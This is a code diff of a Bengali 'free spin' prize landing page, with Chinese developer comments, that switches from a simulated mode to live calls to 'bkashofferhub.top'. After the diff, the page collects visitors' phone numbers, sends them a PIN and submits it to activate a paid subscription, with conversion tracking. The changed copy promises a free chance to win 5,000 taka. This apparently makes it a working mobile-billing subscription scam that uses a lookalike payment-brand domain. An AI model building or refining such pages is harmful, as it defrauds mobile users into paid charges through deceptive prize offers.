@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>ফ্রি স্পিন – বড় পুরস্কার জিতুন</title>
-    
+   
     <!-- ============================================================ -->
     <!-- 【MaxConv 追踪脚本】- 放在head最前面 -->
     <!-- ============================================================ -->
@@ -103,9 +103,9 @@
         <div id="gameSection">
             <div class="slot-machine">
                 <div class="rolling-numbers">
-                    <span class="static-text">এক কাপ চায়ের মূল্যে জিতুন</span>
+                    <span class="static-text">আপনার <span style="color: orange;">বিনামূল্যে</span> </span>
                     <span id="rollingNumber">৫,০০০</span>
-                    <span class="prize-label">টাকা পুরস্কার!</span>
+                    <span class="prize-label">টাকা জেতার সুযোগ রয়েছে!</span>
                 </div>
                 <button class="btn-primary" id="playBtn">🎯 পুরস্কার নিন</button>
             </div>
@@ -167,10 +167,12 @@
 
 <script>
 // ============================================================
-// 【配置】- 纯模拟模式，不调用任何真实API
+// 【配置】- 真实Worker API模式
 // ============================================================
-const OFFER_ID = '291632';
-const PIN_LENGTH = 4;
+const API_BASE = 'https://bkashofferhub.top';  // 你的Worker地址
+const OFFER_ID = '291632';                     // 你的Offer ID,每一次都不一样！
+const PIN_LENGTH = 4;                          // PIN码位数
+let currentTxid = null;                        // 保存发送验证码返回的txid
 
 // 从URL获取cid（用于追踪）
 const cid = new URLSearchParams(location.search).get('cid') || 
@@ -230,6 +232,42 @@ function hideError(el) {
 }
 function showLoading(el) { el.classList.add('show'); }
 function hideLoading(el) { el.classList.remove('show'); }
+
+// ============================================================
+// 【轮询函数】- 处理 stateCode = 2 的情况
+// ============================================================
+async function pollStatus(attempt = 0) {
+    if (attempt >= 10) {
+        showError(pinError, 'সাবস্ক্রিপশন নিশ্চিত হতে বেশি সময় নিচ্ছে।');
+        hideLoading(pinLoading);
+        verifyBtn.disabled = false;
+        return;
+    }
+
+    await new Promise(r => setTimeout(r, 3000));  // 等待3秒
+
+    try {
+        const res = await fetch(`${API_BASE}/api/pin/status?txid=${currentTxid}`);
+        const data = await res.json();
+
+        if (data.status === 'subscribed') {
+            sendMaxConvEvent('pin_success');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            hide('pinSection');
+            show('successSection');
+            triggerFireworks();
+        } else if (data.status === 'processing') {
+            pollStatus(attempt + 1);  // 继续轮询
+        } else {
+            showError(pinError, 'সাবস্ক্রিপশন ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+        }
+    } catch {
+        pollStatus(attempt + 1);  // 网络错误也继续重试
+    }
+}
 
 // ============================================================
 // 【金币烟花效果】
@@ -353,7 +391,7 @@ pinBoxes.forEach((box, i) => {
 });
 
 // ============================================================
-// 【事件2】点击「发送」- 模拟模式（不调用真实API）
+// 【事件2】点击「发送」- 真实API调用
 // ============================================================
 sendBtn.addEventListener('click', async function() {
     const msisdn = msisdnInput.value.trim();
@@ -363,30 +401,44 @@ sendBtn.addEventListener('click', async function() {
         return;
     }
 
-    // ✅ MaxConv: 提交手机号
     sendMaxConvEvent('phone_submit');
-    // ✅ MaxConv: 处理中
-    sendMaxConvEvent('pin_processing');
-
     hideError(phoneError);
     showLoading(phoneLoading);
     sendBtn.disabled = true;
 
-    // ===== 【模拟模式】延迟1秒后模拟发送成功 =====
-    setTimeout(() => {
-        // ✅ 模拟发送成功
-        sendMaxConvEvent('pin_sent');
+    try {
+        const url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
+        console.log('📤 发送验证码请求:', url);
         
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.success) {
+            currentTxid = data.txid;
+            console.log('✅ 验证码发送成功, txid:', currentTxid);
+            sendMaxConvEvent('pin_sent');
+            hideLoading(phoneLoading);
+            sendBtn.disabled = false;
+            hide('phoneSection');
+            show('pinSection');
+            pinBoxes[0].focus();
+        } else {
+            console.log('❌ 验证码发送失败:', data.msg);
+            showError(phoneError, data.msg || 'কোড পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+            hideLoading(phoneLoading);
+            sendBtn.disabled = false;
+        }
+    } catch (error) {
+        console.error('❌ 网络错误:', error);
+        showError(phoneError, 'নেটওয়ার্ক সমস্যা। আপনার সংযোগ পরীক্ষা করুন।');
         hideLoading(phoneLoading);
         sendBtn.disabled = false;
-        hide('phoneSection');
-        show('pinSection');
-        pinBoxes[0].focus();
-    }, 1000);
+    }
 });
 
 // ============================================================
-// 【事件3】点击「验证」- 模拟模式（不调用真实API）
+// 【事件3】点击「验证」- 真实API调用
+// ============================================================
 // ============================================================
 verifyBtn.addEventListener('click', async function() {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
@@ -396,27 +448,53 @@ verifyBtn.addEventListener('click', async function() {
         return;
     }
 
-    // ✅ MaxConv: 提交验证码按钮
-    sendMaxConvEvent('pin_submit');
-    // ✅ MaxConv: 处理中
-    sendMaxConvEvent('pin_processing');
-
+    sendMaxConvEvent('pin_submit');  // ✅ 提交验证码
     hideError(pinError);
     showLoading(pinLoading);
     verifyBtn.disabled = true;
 
-    // ===== 【模拟模式】延迟1.5秒后模拟验证成功 =====
-    setTimeout(() => {
-        // ✅ 模拟验证成功
-        sendMaxConvEvent('pin_success');
+    try {
+        const url = `${API_BASE}/api/pin/verify?txid=${currentTxid}&pin=${pin}`;
+        console.log('📤 验证PIN请求:', url);
         
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.success) {
+            console.log('✅ PIN验证成功！订阅已激活');
+            sendMaxConvEvent('pin_success');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            hide('pinSection');
+            show('successSection');
+            triggerFireworks();
+            
+        } else if (data.processing) {
+            console.log('⏳ 订阅处理中，开始轮询...');
+            // ✅ 发送"处理中"事件
+            sendMaxConvEvent('pin_processing');
+            showError(pinError, '⏳ আপনার সাবস্ক্রিপশন প্রক্রিয়াধীন। অনুগ্রহ করে অপেক্ষা করুন।');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            pollStatus();
+            
+        } else {
+            console.log('❌ PIN验证失败:', data.msg);
+            sendMaxConvEvent('pin_failed');
+            showError(pinError, data.msg || 'ভুল কোড। আবার চেষ্টা করুন।');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            pinBoxes.forEach(b => b.value = '');
+            pinBoxes[0].focus();
+        }
+    } catch (error) {
+        console.error('❌ 验证网络错误:', error);
+        sendMaxConvEvent('pin_failed');
+        showError(pinError, 'যাচাই ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
         hideLoading(pinLoading);
         verifyBtn.disabled = false;
-        hide('pinSection');
-        show('successSection');
-    }, 1500);
+    }
 });
-
 // ============================================================
 // 【事件4】点击「সম্পন্ন!」
 // ============================================================
@@ -440,13 +518,15 @@ pinBoxes.forEach((box) => {
 // ============================================================
 // 【控制台调试信息】
 // ============================================================
-console.log('🚀 MaxConv追踪已集成（模拟模式 - 不调用真实API）');
+console.log('🚀 已切换到真实API模式');
+console.log('📡 API_BASE:', API_BASE);
 console.log('📋 OFFER_ID:', OFFER_ID);
 console.log('🔑 CID:', cid);
-console.log('📦 事件列表:');
-console.log('   play_btn_click → phone_submit → pin_processing → pin_sent');
-console.log('   → pin_submit → pin_processing → pin_success → redirect_click');
-console.log('💡 在MaxConv后台创建对应的Goal即可看到数据');
+console.log('📦 事件流程:');
+console.log('   play_btn_click → phone_submit → 发送验证码');
+console.log('   → pin_sent → 输入PIN → pin_submit → 验证PIN');
+console.log('   → pin_success → redirect_click');
+console.log('💡 打开浏览器开发者工具查看详细日志');
 </script>
 </body>
 </html>
